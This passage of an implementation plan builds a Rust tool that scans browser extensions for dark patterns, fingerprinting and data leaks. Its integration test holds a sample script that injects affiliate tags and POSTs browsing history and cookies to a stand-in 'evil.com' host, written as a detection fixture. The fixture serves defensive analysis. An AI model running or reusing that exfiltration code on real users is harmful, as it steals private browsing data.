                "Review nagging on uninstall",
            )
            .with_description("Extension prompts for review when uninstalled")
            .with_location(Location {
                file: file_path.to_path_buf(),
                line: None,
                column: None,
            })
        );
    }

    findings
}

fn check_notification_spam(source: &str, file_path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for notification creation in loops or with short intervals
    if source.contains("notifications.create") {
        // Look for setInterval with notifications
        if source.contains("setInterval") && source.contains("notification") {
            findings.push(
                Finding::new(
                    Severity::Medium,
                    Category::DarkPattern(DarkPatternType::NotificationSpam),
                    "Potential notification spam",
                )
                .with_description("Extension may send repeated notifications")
                .with_location(Location {
                    file: file_path.to_path_buf(),
                    line: None,
                    column: None,
                })
            );
        }
    }

    findings
}

fn check_fingerprinting(source: &str, file_path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    let fingerprint_apis = [
        ("canvas", "getContext", "Canvas fingerprinting"),
        ("webgl", "getParameter", "WebGL fingerprinting"),
        ("AudioContext", "createOscillator", "Audio fingerprinting"),
    ];

    for (api1, api2, description) in fingerprint_apis {
        if source.contains(api1) && source.contains(api2) {
            findings.push(
                Finding::new(
                    Severity::High,
                    Category::DarkPattern(DarkPatternType::Fingerprinting),
                    description,
                )
                .with_description(format!("Extension may be using {} for user tracking", api1))
                .with_location(Location {
                    file: file_path.to_path_buf(),
                    line: None,
                    column: None,
                })
            );
        }
    }

    findings
}
```

**Step 2: Update mod.rs**

Add to `src/analyze/mod.rs`:

```rust
pub mod dark_patterns;
```

**Step 3: Run cargo check, commit**

```bash
cargo check
git add src/analyze/dark_patterns.rs src/analyze/mod.rs
git commit -m "feat(analyze): add dark_patterns module with static rules"
```

---

### Task 15: Integrate dark patterns into analysis pipeline

**Files:**
- Modify: `src/analyze/mod.rs`

**Step 1: Call dark pattern analysis**

Update `analyze_extension` to include dark pattern checks:

```rust
// In analyze_extension function, after JavaScript analysis:
for file in &extension.files {
    if file.file_type == FileType::JavaScript {
        if let Some(ref content) = file.content {
            let dp_findings = dark_patterns::analyze_dark_patterns(
                content,
                &file.path,
            );
            result.findings.extend(dp_findings);
        }
    }
}
```

**Step 2: Run tests, commit**

```bash
cargo test
git add src/analyze/mod.rs
git commit -m "feat(analyze): integrate dark pattern detection into pipeline"
```

---

## Phase 5: LLM Integration

### Task 16: Add DarkPatternReview task

**Files:**
- Modify: `src/llm/agents.rs`

**Step 1: Add new task type**

```rust
#[derive(Debug, Clone)]
pub enum AnalysisTask {
    ManifestReview,
    ScriptAnalysis,
    EndpointAnalysis,
    FinalSummary,
    Deobfuscate(String),
    DarkPatternReview,  // NEW
}
```

**Step 2: Add prompt builder**

```rust
fn build_dark_pattern_prompt(
    extension: &Extension,
    static_findings: &[Finding],
    endpoints: &[Endpoint],
) -> String {
    let manifest_desc = extension
        .manifest
        .as_ref()
        .and_then(|m| m.description.as_ref())
        .map(|d| d.as_str())
        .unwrap_or("No description");

    let name = extension.name.as_deref().unwrap_or("Unknown");

    // Filter to dark pattern findings
    let dp_findings: Vec<_> = static_findings
        .iter()
        .filter(|f| matches!(f.category, Category::DarkPattern(_)))
        .collect();

    let findings_text = if dp_findings.is_empty() {
        "No static dark patterns detected.".to_string()
    } else {
        dp_findings
            .iter()
            .map(|f| format!("- {}: {}", f.title, f.description))
            .collect::<Vec<_>>()
            .join("\n")
    };

    // Summarize endpoints with data sources
    let endpoints_text = endpoints
        .iter()
        .filter(|e| !e.data_sources.is_empty() || !e.flags.is_empty())
        .map(|e| {
            let sources = e.data_sources.iter().map(|s| s.to_string()).collect::<Vec<_>>().join(", ");
            let flags = e.flags.iter().map(|f| f.description()).collect::<Vec<_>>().join("; ");
            format!("- {} -> {}\n  Data: [{}]\n  Flags: {}",
                e.method.as_ref().map(|m| m.as_str()).unwrap_or("GET"),
                e.url,
                sources,
                if flags.is_empty() { "none" } else { &flags }
            )
        })
        .collect::<Vec<_>>()
        .join("\n");

    format!(
        r#"You are analyzing a browser extension for dark patterns - deceptive practices that manipulate users against their interests.

Extension: {name}
Stated purpose: {manifest_desc}

== Static Analysis Flags ==
{findings_text}

== Data Flow Summary ==
{endpoints_text}

== Questions to Answer ==

1. MONETIZATION: Does this extension inject affiliate links, ads, or modify prices/search results without clear disclosure?

2. PRIVACY: Does the data collection align with the stated purpose? Is any data sent to unexpected third parties?

3. MANIPULATION: Are there patterns designed to nag, pressure, or trick users (fake urgency, hidden subscription prompts, review begging)?

4. BAIT-AND-SWITCH: Does the actual behavior match what's promised in the name and description?

For each dark pattern found, respond with:
- TYPE: [category]
- SEVERITY: [low/medium/high/critical]
- EVIDENCE: [specific code or behavior]
- EXPLANATION: [why this harms users]

If no dark patterns are found, say "No dark patterns detected" and briefly explain why the extension appears legitimate."#
    )
}
```

**Step 3: Update build_prompt to handle new task**

```rust
fn build_prompt(
    task: &AnalysisTask,
    extension: &Extension,
    static_findings: &[Finding],
    endpoints: &[Endpoint],
) -> String {
    match task {
        // ... existing cases ...
        AnalysisTask::DarkPatternReview => build_dark_pattern_prompt(extension, static_findings, endpoints),
    }
}
```

**Step 4: Commit**

```bash
git add src/llm/agents.rs
git commit -m "feat(llm): add DarkPatternReview analysis task"
```

---

### Task 17: Add DarkPatternReview to default tasks

**Files:**
- Modify: `src/main.rs`

**Step 1: Update task list**

```rust
let tasks = vec![
    AnalysisTask::ManifestReview,
    AnalysisTask::ScriptAnalysis,
    AnalysisTask::EndpointAnalysis,
    AnalysisTask::DarkPatternReview,  // NEW
    AnalysisTask::FinalSummary,
];
```

**Step 2: Commit**

```bash
git add src/main.rs
git commit -m "feat: include DarkPatternReview in default LLM analysis"
```

---

## Phase 6: Output Improvements

### Task 18: Update endpoint grouping in terminal.rs

**Files:**
- Modify: `src/output/terminal.rs`

**Step 1: Rewrite print_endpoints_section**

```rust
fn print_endpoints_section(endpoints: &[Endpoint]) {
    if endpoints.is_empty() {
        return;
    }

    println!(
        "{}",
        "── Network Endpoints ────────────────────────────────────────".bright_black()
    );

    // Group by URL
    let mut grouped: HashMap<String, Vec<&Endpoint>> = HashMap::new();
    for endpoint in endpoints {
        grouped.entry(endpoint.url.clone()).or_default().push(endpoint);
    }

    // Sort by context severity
    let mut sorted: Vec<_> = grouped.into_iter().collect();
    sorted.sort_by(|a, b| {
        let max_a = a.1.iter().map(|e| context_severity(&e.context)).max().unwrap_or(0);
        let max_b = b.1.iter().map(|e| context_severity(&e.context)).max().unwrap_or(0);
        max_b.cmp(&max_a).then_with(|| a.0.cmp(&b.0))
    });

    for (url, endpoint_group) in sorted {
        println!();
        println!("  {}", url.white());

        // Collect unique methods with their locations
        let mut methods: HashMap<String, Vec<String>> = HashMap::new();
        let mut all_sources: Vec<DataSource> = Vec::new();
        let mut all_flags: Vec<&EndpointFlag> = Vec::new();
        let mut context = EndpointContext::Unknown;

        for ep in &endpoint_group {
            let method = ep.method.as_ref().map(|m| m.as_str()).unwrap_or("GET").to_string();
            let loc = ep.location.to_string();
            methods.entry(method).or_default().push(loc);

            for source in &ep.data_sources {
                if !all_sources.contains(source) {
                    all_sources.push(source.clone());
                }
            }

            all_flags.extend(&ep.flags);

            if context_severity(&ep.context) > context_severity(&context) {
                context = ep.context.clone();
            }
        }

        // Print methods
        for (method, locations) in &methods {
            let loc_str = if locations.len() == 1 {
                format!("({})", locations[0])
            } else {
                format!("(×{} calls)", locations.len())
            };
            println!("    {} {:<6} {}", "→".bright_black(), method.cyan(), loc_str.bright_black());
        }

        // Print data sources if any
        if !all_sources.is_empty() {
            let sources_str = all_sources.iter().map(|s| s.to_string()).collect::<Vec<_>>().join(", ");
            println!("        Sends: {}", sources_str.yellow());
        }

        // Print flags if any
        for flag in all_flags {
            let flag_str = match flag {
                EndpointFlag::CrossDomainTransfer { source_domain } => {
                    format!("⚠ Cross-domain transfer from {}", source_domain).red().to_string()
                }
                EndpointFlag::SensitiveData => "⚠ Receives sensitive data".red().to_string(),
                EndpointFlag::KnownTracker => "● Known tracker".yellow().to_string(),
            };
            println!("        {}", flag_str);
        }

        // Print context
        let context_colored = match context {
            EndpointContext::Suspicious => "SUSPICIOUS".red(),
            EndpointContext::KnownMalicious => "MALICIOUS".red().bold(),
            EndpointContext::Analytics => "ANALYTICS".yellow(),
            EndpointContext::Telemetry => "TELEMETRY".yellow(),
            EndpointContext::Api => "API".green(),
            EndpointContext::Unknown => "UNKNOWN".bright_black(),
        };
        println!("    Context: {}", context_colored);
    }

    println!();
}
```

**Step 2: Run tests, commit**

```bash
cargo test
git add src/output/terminal.rs
git commit -m "feat(output): group endpoints by URL with methods listed underneath"
```

---

### Task 19: Add dark patterns output section

**Files:**
- Modify: `src/output/terminal.rs`

**Step 1: Add new function**

```rust
fn print_dark_patterns_section(findings: &[Finding]) {
    let dp_findings: Vec<_> = findings
        .iter()
        .filter(|f| matches!(f.category, Category::DarkPattern(_)))
        .collect();

    if dp_findings.is_empty() {
        return;
    }

    println!(
        "{}",
        "── Dark Patterns ────────────────────────────────────────────".bright_black()
    );

    for finding in dp_findings {
        print_finding(finding);
    }

    println!();
}
```

**Step 2: Call it from print_analysis_result**

```rust
pub fn print_analysis_result(extension: &Extension, result: &AnalysisResult) {
    print_header(extension);
    print_permissions_section(&result.findings);
    print_code_findings_section(&result.findings);
    print_dark_patterns_section(&result.findings);  // NEW
    print_endpoints_section(&result.endpoints);

    if let Some(ref summary) = result.llm_summary {
        print_llm_summary(summary);
    }
}
```

**Step 3: Commit**

```bash
git add src/output/terminal.rs
git commit -m "feat(output): add dark patterns section to terminal output"
```

---

### Task 20: Add --min-severity CLI flag

**Files:**
- Modify: `src/main.rs`
- Modify: `src/output/terminal.rs`

**Step 1: Add CLI argument**

```rust
#[derive(Parser, Debug)]
#[command(name = "extanalyzer")]
#[command(about = "Analyze Chrome and Firefox browser extensions for security issues")]
#[command(version)]
struct Args {
    // ... existing args ...

    /// Minimum severity level to display (info, low, medium, high, critical)
    #[arg(long, default_value = "medium")]
    min_severity: String,
}
```

**Step 2: Parse severity and pass to output**

```rust
fn parse_min_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        "info" => Severity::Info,
        _ => Severity::Medium,
    }
}

// In analyze_single:
let min_severity = parse_min_severity(&args.min_severity);
print_analysis_result(&extension, &result, min_severity);
```

**Step 3: Update print_analysis_result signature**

```rust
pub fn print_analysis_result(extension: &Extension, result: &AnalysisResult, min_severity: Severity) {
    print_header(extension);
    print_permissions_section(&result.findings, &min_severity);
    print_code_findings_section(&result.findings, &min_severity);
    print_dark_patterns_section(&result.findings, &min_severity);
    print_endpoints_section(&result.endpoints, &min_severity);

    if let Some(ref summary) = result.llm_summary {
        print_llm_summary(summary);
    }
}
```

**Step 4: Filter findings in each section**

```rust
fn print_permissions_section(findings: &[Finding], min_severity: &Severity) {
    let permission_findings: Vec<_> = findings
        .iter()
        .filter(|f| matches!(f.category, Category::Permission))
        .filter(|f| &f.severity <= min_severity)  // Filter by severity
        .collect();

    // ... rest unchanged
}
```

**Step 5: Run tests, commit**

```bash
cargo test
git add src/main.rs src/output/terminal.rs
git commit -m "feat(cli): add --min-severity flag to filter output"
```

---

## Final Task: Integration Test

### Task 21: Add integration test for dark pattern detection

**Files:**
- Create: `tests/dark_pattern_tests.rs`

**Step 1: Write integration test**

```rust
use extanalyzer::analyze::javascript::analyze_javascript;
use extanalyzer::models::{Category, DarkPatternType, DataSource, EndpointFlag};
use std::path::Path;

#[test]
fn test_full_dark_pattern_detection() {
    let code = r#"
        // Affiliate injection
        document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
            link.href = link.href + '?tag=myaffiliate-20';
        });

        // Data exfiltration
        let history = await chrome.history.search({ text: '' });
        let cookies = document.cookie;

        fetch('https://tracker.evil.com/collect', {
            method: 'POST',
            body: JSON.stringify({ history, cookies })
        });

        // Review nagging
        chrome.runtime.setUninstallURL('https://chrome.google.com/webstore/detail/myext/reviews');
    "#;

    let (findings, endpoints) = analyze_javascript(code, Path::new("evil.js"));

    // Check for affiliate injection finding
    assert!(findings.iter().any(|f|
        matches!(&f.category, Category::DarkPattern(DarkPatternType::AffiliateInjection))
    ));

    // Check for data exfiltration (cross-domain transfer)
    assert!(findings.iter().any(|f|
        matches!(&f.category, Category::DarkPattern(DarkPatternType::DataExfiltration))
    ));

    // Check endpoint has correct data sources
    let evil_endpoint = endpoints.iter().find(|e| e.url.contains("evil.com")).unwrap();
    assert!(evil_endpoint.data_sources.iter().any(|s| matches!(s, DataSource::BrowsingHistory)));
    assert!(evil_endpoint.data_sources.iter().any(|s| matches!(s, DataSource::Cookie(_))));
}
```

**Step 2: Run test, commit**

```bash
cargo test test_full_dark_pattern_detection -- --exact
git add tests/dark_pattern_tests.rs
git commit -m "test: add integration test for dark pattern detection"
```

---

## Summary

This plan implements:
1. **DataSource tracking** - 8 source types tracked through variable assignments
2. **Cross-domain detection** - Flags when data from one domain flows to another
3. **Endpoint grouping** - URLs shown once with methods underneath
4. **Dark pattern rules** - Static detection for affiliate injection, fingerprinting, notification spam, review nagging
5. **LLM integration** - DarkPatternReview task with detailed prompt
6. **Severity filtering** - --min-severity CLI flag

Total: 21 tasks, each 2-5 minutes
